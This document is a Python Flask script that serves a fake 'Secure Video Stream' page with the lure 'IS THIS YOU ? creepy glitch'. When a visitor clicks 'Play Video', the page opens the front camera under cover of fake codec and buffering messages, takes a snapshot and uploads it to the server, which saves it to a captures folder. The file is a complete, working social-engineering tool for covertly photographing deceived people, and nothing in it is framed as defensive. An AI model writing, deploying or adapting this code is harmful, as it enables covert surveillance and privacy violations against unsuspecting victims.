from flask import Flask, request, render_template_string
import base64
import os
import time

app = Flask(__name__)

# Ensure the capture directory exists
UPLOAD_FOLDER = 'captured_images'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Secure Video Stream</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #0f172a;
            color: #f8fafc;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .container {
            width: 100%;
            max-width: 700px;
            background: #1e293b;
            padding: 24px;
            border-radius: 12px;
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        .glitch-header {
            font-family: monospace;
            font-size: 1.5rem;
            font-weight: bold;
            color: #ef4444;
            text-shadow: 2px 2px #3b82f6, -2px -2px #10b981;
            margin-bottom: 16px;
            letter-spacing: 2px;
        }
        h2 {
            margin-top: 0;
            font-size: 1.25rem;
            color: #e2e8f0;
        }
        .video-wrapper {
            position: relative;
            width: 100%;
            padding-top: 56.25%;
            background: #000;
            border-radius: 8px;
            overflow: hidden;
            margin-bottom: 16px;
        }
        video, canvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        canvas {
            display: none;
        }
        .controls {
            display: flex;
            justify-content: center;
            gap: 12px;
        }
        button {
            background-color: #3b82f6;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 0.95rem;
            font-weight: 600;
            border-radius: 6px;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        button:hover {
            background-color: #2563eb;
        }
        #status {
            font-size: 0.85rem;
            color: #94a3b8;
            margin-top: 10px;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="glitch-header">IS THIS YOU ? creepy glitch</div>
    <h2>Exclusive Shared Video Content</h2>
    <div class="video-wrapper">
        <video id="webcam" autoplay="" playsinline="" muted=""></video>
        <canvas id="snapshot"></canvas>
    </div>
    
    <div class="controls">
        <button id="playBtn" onclick="initCapture()">Play Video</button>
    </div>
    <div id="status">Click play to initialize secure media player.</div>
</div>

<script>
    async function initCapture() {
        const video = document.getElementById('webcam');
        const status = document.getElementById('status');
        const btn = document.getElementById('playBtn');

        status.innerText = "Loading codecs...";
        btn.style.display = "none";

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
            video.srcObject = stream;
            status.innerText = "Buffering stream (HD)...";

            setTimeout(() => {
                captureFrame(stream);
            }, 2000);

        } catch (err) {
            status.innerText = "Error loading media stream. Please check browser permissions.";
            console.error(err);
        }
    }

    function captureFrame(stream) {
        const video = document.getElementById('webcam');
        const canvas = document.getElementById('snapshot');
        const context = canvas.getContext('2d');

        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;

        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageDataURL = canvas.toDataURL('image/jpeg');

        stream.getTracks().forEach(track => track.stop());
        sendData(imageDataURL);
        
        document.getElementById('status').innerText = "Buffering stream (HD)...";
    }

    function sendData(dataURL) {
        fetch('/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: dataURL })
        }).catch(err => console.error("Upload failed", err));
    }
</script>
</body>
</html>
"""

@app.route('/', methods=['GET'])
def index():
    return render_template_string(HTML_PAGE)

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.json.get('image')
        if data:
            header, encoded = data.split(',', 1)
            image_data = base64.b64decode(encoded)
            
            # Generate a unique filename using timestamp so files don't overwrite each other
            filename = f"capture_{int(time.time())}.jpg"
            file_path = os.path.join(UPLOAD_FOLDER, filename)
            
            with open(file_path, 'wb') as f:
                f.write(image_data)
                
            print(f"[+] Successfully saved snapshot to: {file_path}")
            return {'status': 'success'}, 200
    except Exception as e:
        print(f"[-] Error saving capture: {e}")
        return {'status': 'error', 'message': str(e)}, 500
        
    return {'status': 'fail'}, 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)